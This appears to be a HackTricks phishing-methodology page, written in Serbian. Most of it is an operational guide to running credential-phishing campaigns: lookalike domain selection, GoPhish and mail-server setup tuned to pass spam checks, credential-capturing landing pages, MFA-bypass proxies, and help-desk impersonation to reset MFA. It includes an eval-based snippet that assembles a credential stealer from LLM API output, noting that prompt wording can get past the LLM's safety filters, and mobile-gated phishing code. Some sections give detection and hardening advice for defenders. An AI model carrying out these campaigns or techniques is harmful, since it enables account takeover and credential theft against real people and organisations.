# Phishing metodologija

{{#include ../../banners/hacktricks-training.md}}

## Metodologija

1. Recon žrtve
1. Izaberite **domen žrtve**.
2. Obavite osnovnu web enumeraciju **tražeći portale za prijavu** koje koristi žrtva i **odlučite** koji ćete **imitirati**.
3. Koristite **OSINT** da **pronađete adrese e-pošte**.
2. Pripremite okruženje
1. **Kupite domen** koji ćete koristiti za phishing procenu
2. **Konfigurišite zapise povezane sa email servisom** (SPF, DMARC, DKIM, rDNS)
3. Konfigurišite VPS sa **gophish**
3. Pripremite kampanju
1. Pripremite **email šablon**
2. Pripremite **web stranicu** za krađu kredencijala
4. Pokrenite kampanju!

## Generišite slična imena domena ili kupite pouzdan domen

### Tehnike varijacije imena domena

- **Keyword**: Ime domena **sadrži** važnu **ključnu reč** originalnog domena (npr., zelster.com-management.com).
- **hypened subdomain**: Zamenite **tačku crticom** u poddomeni (npr., www-zelster.com).
- **New TLD**: Isti domen koristeći **novi TLD** (npr., zelster.org)
- **Homoglyph**: Zamenjuje slovo u imenu domena sa **slovima koja izgledaju slično** (npr., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Zamenjuje dva slova unutar imena domena (npr., zelsetr.com).
- **Singularization/Pluralization**: Dodaje ili uklanja “s” na kraju imena domena (npr., zeltsers.com).
- **Omission**: Uklanja jedno od slova iz imena domena (npr., zelser.com).
- **Repetition:** Ponavlja jedno od slova u imenu domena (npr., zeltsser.com).
- **Replacement**: Kao homoglyph ali manje prikriveno. Zamenjuje jedno od slova u imenu domena, možda sa slovom u blizini originalnog na tastaturi (npr., zektser.com).
- **Subdomained**: Uvodi **tačku** unutar imena domena (npr., ze.lster.com).
- **Insertion**: Umeće slovo u ime domena (npr., zerltser.com).
- **Missing dot**: Dodaje TLD na kraj imena domena. (npr., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Postoji **mogućnost da se neki bitovi uskladišteni ili u komunikaciji automatski preokrenu** zbog različitih faktora kao što su solarne oluje, kosmički zraci ili hardverske greške.

Kada se ovaj koncept **primeni na DNS zahteve**, moguće je da **domen koji DNS server zaprimi** nije isti kao domen koji je inicijalno zatražen.

Na primer, jedna modifikacija bita u domenu "windows.com" može ga promeniti u "windnws.com."

Napadači mogu **iskoristiti ovo registrujući više bit-flipping domena** koji su slični domenu žrtve. Njihova namera je da preusmere legitimne korisnike na sopstvenu infrastrukturu.

Za više informacija pročitajte [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Kupovina pouzdanog domena

Možete pretražiti na [https://www.expireddomains.net/](https://www.expireddomains.net) istekli domen koji biste mogli koristiti.\
Da biste bili sigurni da istekli domen koji nameravate da kupite **već ima dobar SEO**, možete proveriti kako je kategorizovan na:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Otkrivanje adresa e-pošte

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Da biste **otkrili više** validnih adresa e-pošte ili **verifikovali one** koje ste već otkrili, možete proveriti da li možete brute-force-ovati SMTP servere žrtve. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Pored toga, ne zaboravite da ako korisnici koriste **bilo koji web portal za pristup svojim mejlovima**, možete proveriti da li je podložan **username brute force**, i iskoristiti ranjivost ako je moguće.

## Konfigurisanje GoPhish

### Instalacija

Možete ga preuzeti sa [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Preuzmite i raspakujte ga u `/opt/gophish` i pokrenite `/opt/gophish/gophish`\
U izlazu će vam biti prikazana lozinka za admin nalog za port 3333. Zato pristupite tom portu i koristite te kredencijale da promenite administratorsku lozinku. Možda ćete morati da tunelujete taj port lokalno:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracija

**Konfiguracija TLS sertifikata**

Pre ovog koraka trebalo bi da ste **već kupili domain** koji ćete koristiti i on mora da bude **usmeren** na **IP of the VPS** na kojem konfigurišete **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail konfiguracija**

Počnite instalaciju: `apt-get install postfix`

Zatim dodajte domen u sledeće fajlove:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Takođe promenite vrednosti sledećih promenljivih u okviru /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na kraju izmenite fajlove **`/etc/hostname`** i **`/etc/mailname`** na vaš domen i **restartujte vaš VPS.**

Sada kreirajte **DNS A record** za `mail.<domain>` koji pokazuje na **ip address** VPS-a i **DNS MX** record koji pokazuje na `mail.<domain>`

Sada testirajmo slanje email-a:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish konfiguracija**

Zaustavite izvršavanje gophish-a i konfigurišimo ga.\
Izmenite `/opt/gophish/config.json` kako sledi (obratite pažnju na korišćenje https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfigurišite gophish servis**

Da biste kreirali gophish servis tako da može biti automatski pokrenut i upravljan kao servis, možete kreirati fajl `/etc/init.d/gophish` sa sledećim sadržajem:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Dovršite konfiguraciju servisa i proverite ga ovako:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurisanje mail servera i domena

### Sačekajte i delujte legitimno

Što je domen stariji, to je manja verovatnoća da će biti označen kao spam. Zbog toga bi trebalo da čekate što duže (najmanje 1 nedelju) pre phishing procene. Pored toga, ako postavite stranicu vezanu za sektor koji ima dobru reputaciju, dobijena reputacija će biti bolja.

Imajte na umu da, iako treba da čekate nedelju dana, možete već sada završiti svu konfiguraciju.

### Konfigurišite Reverse DNS (rDNS) zapis

Postavite rDNS (PTR) zapis koji povezuje IP adresu VPS-a sa imenom domena.

### Sender Policy Framework (SPF) zapis

Morate **konfigurisati SPF zapis za novi domen**. Ako ne znate šta je SPF zapis [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Možete koristiti [https://www.spfwizard.net/](https://www.spfwizard.net) da generišete vašu SPF politiku (koristite IP VPS mašine)

![](<../../images/image (1037).png>)

Ovo je sadržaj koji treba postaviti u TXT zapis za domen:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Autentifikacija poruka zasnovana na domenu, izveštavanje i usklađenost (DMARC) zapis

Morate **konfigurisati DMARC zapis za novi domen**. Ako ne znate šta je DMARC zapis [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Morate da kreirate novi DNS TXT zapis za hostname `_dmarc.<domain>` sa sledećim sadržajem:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Morate **konfigurisati DKIM za novi domen**. Ako ne znate šta je DMARC zapis [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ovaj tutorijal je zasnovan na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Potrebno je spojiti obe B64 vrednosti koje DKIM ključ generiše:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testirajte ocenu konfiguracije e-pošte

Možete to uraditi koristeći [https://www.mail-tester.com/](https://www.mail-tester.com)\
Jednostavno otvorite stranicu i pošaljite e-poruku na adresu koju vam daju:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Možete такође **проверити конфигурацију e‑поште** слanjem е‑поруке на `check-auth@verifier.port25.com` и **прочитати одговор** (за ово ћете морати да **отворите** порт **25** и погледате одговор у фајлу _/var/mail/root_ ако пошаљете е‑пошту као root).\
Проверите да ли пролазите све тестове:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Možete takođe poslati **poruku na Gmail nalog pod vašom kontrolom** i proveriti **zaglavlja e-pošte** u svom Gmail inboxu; `dkim=pass` treba da bude prisutan u polju zaglavlja `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Uklanjanje sa Spamhouse Blacklist

Stranica [www.mail-tester.com](https://www.mail-tester.com) može da vam pokaže da li je vaš domen blokiran od strane Spamhaus-a. Možete zatražiti uklanjanje domena/IP-a na: [https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Uklanjanje sa Microsoft Blacklist

Možete zatražiti uklanjanje vašeg domena/IP-a na [https://sender.office.com/](https://sender.office.com).

## Kreiranje i pokretanje GoPhish kampanje

### Profil za slanje

- Postavite neko **ime za identifikaciju** profila pošiljaoca
- Odlučite sa kojeg naloga ćete slati phishing mejlove. Predlozi: _noreply, support, servicedesk, salesforce..._
- Možete ostaviti prazno korisničko ime i lozinku, ali obavezno označite Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Preporučuje se upotreba funkcionalnosti "**Send Test Email**" da biste testirali da li sve radi.\
> Preporučio bih da **pošaljete test mejlove na 10min mails adrese** kako biste izbegli stavljanje na crnu listu prilikom testiranja.

### Šablon mejla

- Postavite neko **ime za identifikaciju** šablona
- Zatim napišite **subject** (ništa čudno, samo nešto što biste očekivali u uobičajenom mejlu)
- Uverite se da ste označili "**Add Tracking Image**"
- Napišite **email template** (možete koristiti varijable kao u sledećem primeru):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Imajte na umu da bi, **kako biste povećali verodostojnost emaila**, bilo preporučljivo koristiti neki potpis iz emaila od klijenta. Predlozi:

- Pošaljite email na **nepostojeću adresu** i proverite da li odgovor sadrži neki potpis.
- Potražite **javne email adrese** kao što su info@ex.com, press@ex.com ili public@ex.com, pošaljite im email i sačekajte odgovor.
- Pokušajte da kontaktirate **neku važeću pronađenu** email adresu i sačekajte odgovor.

![](<../../images/image (80).png>)

> [!TIP]
> Šablon emaila takođe omogućava da **priložite fajlove za slanje**. Ako biste želeli i da ukradete NTLM izazove koristeći neke posebno izrađene fajlove/dokumente, pročitajte [ovu stranicu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Navedite **ime**
- **Napišite HTML kod** veb stranice. Imajte na umu da možete **importovati** veb stranice.
- Označite **Capture Submitted Data** i **Capture Passwords**
- Podesite **redirekciju**

![](<../../images/image (826).png>)

> [!TIP]
> Obično ćete morati da modifikujete HTML kod stranice i napravite nekoliko testova lokalno (možda koristeći neki Apache server) **dok ne budete zadovoljni rezultatima.** Zatim unesite taj HTML kod u polje.\
> Imajte na umu da ako su vam potrebni **staticki resursi** za HTML (npr. CSS i JS fajlovi) možete ih sačuvati u _**/opt/gophish/static/endpoint**_ i potom pristupati im preko _**/static/\<filename>**_

> [!TIP]
> Za redirekciju možete **preusmeriti korisnike na legitimnu glavnu veb stranicu** žrtve, ili preusmeriti ih na _/static/migration.html_ na primer, prikazati neki **spinning wheel** ([https://loading.io/](https://loading.io)) 5 sekundi i zatim označiti da je proces uspešno završen.

### Users & Groups

- Podesite ime
- **Importujte podatke** (imajte na umu da za upotrebu primera iz šablona trebate firstname, last name i email address svakog korisnika)

![](<../../images/image (163).png>)

### Campaign

Na kraju, kreirajte campaign tako što ćete izabrati ime, the email template, the landing page, URL, the Sending Profile i grupu. Imajte na umu da će URL biti link poslat žrtvama.

Imajte na umu da **Sending Profile omogućava slanje test emaila da biste videli kako će krajnji phishing email izgledati**:

![](<../../images/image (192).png>)

> [!TIP]
> Preporučio bih da **test emailove šaljete na 10min mail adrese** kako biste izbegli da vas testovi stave na crnu listu.

Kada je sve spremno, samo lansirajte campaign!

## Website Cloning

Ako iz bilo kog razloga želite da klonirate veb sajt, pogledajte sledeću stranicu:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

U nekim phishing ocenama (uglavnom za Red Teams) može biti poželjno i da **pošaljete fajlove koji sadrže neki vid backdoora** (možda C2 ili nešto što će pokrenuti autentikaciju).\
Pogledajte sledeću stranicu za neke primere:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Prethodni napad je prilično lukav jer falsifikujete pravi veb sajt i sakupljate informacije koje korisnik unese. Nažalost, ako korisnik nije uneo tačnu lozinku ili ako je aplikacija koju ste falsifikovali konfigurisana sa 2FA, **ove informacije vam neće omogućiti da se predstavljate kao prevaren korisnik**.

Tu dolaze alati poput [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). Ovi alati vam omogućavaju da generišete MitM napad. U suštini, napad funkcioniše na sledeći način:

1. Vi **imitirate login** formu pravog veb sajta.
2. Korisnik **pošalje** svoje **credentials** na vašu lažnu stranu i alat ih prosleđuje na pravi veb sajt, **proveravajući da li kredencijali rade**.
3. Ako nalog ima **2FA**, MitM stranica će tražiti kod i kada **korisnik unese** kod, alat će ga proslediti na pravi veb sajt.
4. Kada je korisnik autentifikovan, vi (kao napadač) ćete imati **uhvaćene kredencijale, 2FA, cookie i sve informacije** o svakoj interakciji dok alat izvodi MitM.

### Via VNC

Šta ako umesto da **preusmerite žrtvu na zlonamernu stranicu** koja liči na original, pošaljete je u **VNC sesiju sa browserom povezan na pravi veb sajt**? Moći ćete da vidite šta radi, ukradete lozinku, MFA koji koristi, cookies...\
Ovo možete uraditi pomoću [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Očigledno, jedan od najboljih načina da saznate da li ste otkriveni je da **pretražite vaš domen u crnim listama**. Ako se pojavi na listi, vaš domen je prepoznat kao sumnjiv.\
Jedan lak način da proverite da li se vaš domen pojavljuje u nekoj crnoj listi je da koristite [https://malwareworld.com/](https://malwareworld.com)

Međutim, postoje i drugi načini da saznate da li žrtva **aktivno traži sumnjive phishing aktivnosti u prirodi**, kako je objašnjeno u:

{{#ref}}
detecting-phising.md
{{#endref}}

Možete **kupiti domen vrlo sličnog imena** žrtvinom domenu **i/ili generisati sertifikat** za **subdomen** domena koji kontrolišete, **sadržeći** **ključnu reč** iz žrtvinog domena. Ako **žrtva** izvrši bilo kakvu **DNS ili HTTP interakciju** sa njima, znaćete da **aktivno traži** sumnjive domene i moraćete da budete vrlo prikriveni.

### Evaluate the phishing

Koristite [**Phishious**](https://github.com/Rices/Phishious) da procenite da li će vaš email završiti u spam folderu, biće blokiran ili uspešan.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderni napadi sve više preskaču email mamce i **direktno ciljaju service-desk / identity-recovery workflow** da bi zaobišli MFA. Napad je u potpunosti "living-off-the-land": kada operater stekne validne kredencijale, pivotuje koristeći ugrađene admin alate – nije potreban malware.

### Attack flow
1. Recon žrtve
* Skupljanje ličnih i korporativnih podataka sa LinkedIn, data breaches, javnog GitHub-a itd.
* Identifikujte visokovredne identitete (izvršni, IT, finansije) i razradite **tačan help-desk proces** za reset lozinke / MFA.
2. Real-time social engineering
* Telefonom, Teams-om ili chatom kontaktirajte help-desk dok se predstavljate kao cilj (često sa **spoofed caller-ID** ili **kloniranim glasom**).
* Dostavite prethodno prikupljene PII da biste prošli proveru zasnovanu na znanju.
* Ubedite agenta da **resetuje MFA secret** ili izvrši **SIM-swap** na registrovani mobilni broj.
3. Hitne post-access akcije (≤60 min u realnim slučajevima)
* Uspostavite foothold kroz bilo koji web SSO portal.
* Enumerišite AD / AzureAD koristeći ugrađene alate (bez izvršavanja binarnih fajlova):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateralni pokreti koristeći **WMI**, **PsExec**, ili legitimne **RMM** agente koji su već na whitelisti u okruženju.

### Detection & Mitigation
* Tretirajte help-desk identity recovery kao **privilegovanu operaciju** – zahtevajte step-up auth i odobrenje menadžera.
* Rasporedite pravila **Identity Threat Detection & Response (ITDR)** / **UEBA** koja generišu upozorenja na:
* Promenu MFA metode + autentikaciju sa novog uređaja / geolokacije.
* Trenutno povećanje privilegija istog subjekta (user → admin).
* Snimajte help-desk pozive i primenite **call-back na već registrovani broj** pre bilo kakvog reseta.
* Implementirajte **Just-In-Time (JIT) / Privileged Access** tako da novopodešeni nalozi **ne dobiju automatski visoke privilegije**.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Komercijalne grupe nadoknađuju troškove visokopreciznih operacija masovnim napadima koji pretvaraju **pretraživače i mreže oglasa u kanal isporuke**.

1. **SEO poisoning / malvertising** guraju lažni rezultat kao što je `chromium-update[.]site` na vrh pretraga/oglasa.
2. Žrtva preuzme mali **first-stage loader** (često JS/HTA/ISO). Primeri viđeni od strane Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader izvlači cookie-je pretraživača + credential DBs, zatim povlači **silent loader** koji odlučuje – *u realnom vremenu* – da li da deploy-uje:
* RAT (npr. AsyncRAT, RustDesk)
* ransomware / wiper
* komponentu za persistance (registry Run key + scheduled task)

### Hardening tips
* Blokirajte novoregistrovane domene i primenjujte **Advanced DNS / URL Filtering** na *search-ads* kao i na email.
* Ograničite instalaciju softvera na potpisane MSI / Store pakete, zabranite izvršavanje `HTA`, `ISO`, `VBS` politikom.
* Monitorišite za child procese browsera koji otvaraju instalacione fajlove:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Pratite LOLBins često zloupotrebljavane od strane first-stage loader-a (npr. `regsvr32`, `curl`, `mshta`).

---

## AI-Enhanced Phishing Operations
Napadači sada kombinuju **LLM & voice-clone API-je** za potpuno personalizovane mamce i interakciju u realnom vremenu.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Odbrana:**
• Dodajte **dinamičke banere** koji ističu poruke poslate iz nepouzdanih automatizacija (preko ARC/DKIM anomalija).  
• Implementirajte **voice-biometric challenge phrases** za visokorizične telefonske zahteve.  
• Kontinuirano simulirajte AI-generisane mamce u programima podizanja svesti – statički šabloni su zastareli.

Videti takođe – agentic browsing abuse za credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Videti takođe – AI agent abuse of local CLI tools and MCP (za inventar tajni i detekciju):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Napadači mogu poslati HTML koji izgleda benigno i **generisati stealer u runtime-u** tako što zatraže od **pouzdanog LLM API-ja** JavaScript, a zatim ga izvrše u browseru (npr. `eval` ili dinamički `<script>`).

1. **Prompt-as-obfuscation:** enkodirajte exfil URL-ove/Base64 stringove u prompt; iterišite wording da biste zaobišli sigurnosne filtere i smanjili halucinacije.
2. **Client-side API call:** na učitavanju, JS poziva javni LLM (Gemini/DeepSeek/etc.) ili CDN proxy; u statičkom HTML-u ostaje samo prompt/API poziv.
3. **Assemble & exec:** konkatenirajte odgovor i izvršite ga (polimorfno po poseti):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generisani kod personalizuje mamac (npr. LogoKit token parsing) i šalje creds na prompt-hidden endpoint.

**Osobine izbegavanja**
- Saobraćaj cilja poznate LLM domene ili ugledne CDN proxy-e; ponekad preko WebSockets ka backend-u.
- Nema statičkog payload-a; zlonamerni JS postoji samo nakon renderovanja.
- Nedeterminističke generacije proizvode **unique** stealers po sesiji.

**Ideje za detekciju**
- Run sandboxes with JS enabled; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Hunt for front-end POSTs to LLM APIs immediately followed by `eval`/`Function` on returned text.
- Alert on unsanctioned LLM domains in client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token. Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Nadgledajte AzureAD/AWS/Okta događaje gde se **`deleteMFA` + `addMFA`** dešavaju **u roku od nekoliko minuta sa iste IP adrese**.



## Clipboard Hijacking / Pastejacking

Napadači mogu tiho da kopiraju zlonamerne komande u žrtvin clipboard sa kompromitovane ili typosquatted web stranice i potom prevariti korisnika da ih nalepi u okviru **Win + R**, **Win + X** ili a terminal window, izvršavajući proizvoljan code bez ikakvog preuzimanja ili priloga.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatori sve češće stavljaju phishing flows iza jednostavne provere uređaja tako da desktop crawlers nikada ne dođu do krajnjih stranica. Uobičajen obrazac je mali skript koji proverava da li je DOM touch-capable i šalje rezultat na server endpoint; non‑mobile klijenti dobijaju HTTP 500 (ili praznu stranicu), dok mobile users dobijaju full flow.

Minimalni klijentski snippet (tipična logika):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (pojednostavljeno):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Ponašanje servera koje se često primećuje:
- Postavlja session cookie pri prvom učitavanju.
- Prihvata `POST /detect {"is_mobile":true|false}`.
- Vraća 500 (ili placeholder) na naredne GET zahteve kada je `is_mobile=false`; prikazuje phishing samo ako je `true`.

Heuristike za pronalaženje i detekciju:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetrija: sekvenca `GET /static/detect_device.js` → `POST /detect` → HTTP 500 za non‑mobile; legitimne putanje mobilnih žrtava vraćaju 200 sa pratećim HTML/JS.
- Blokirajte ili detaljno pregledajte stranice koje uslovljavaju sadržaj isključivo na `ontouchstart` ili sličnim proverama uređaja.

Saveti za odbranu:
- Pokrenite crawlers sa mobile‑like fingerprints i omogućenim JS da otkrijete gated content.
- Upozorite na sumnjive 500 odgovore koji slede nakon `POST /detect` na novoregistrovanim domenima.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
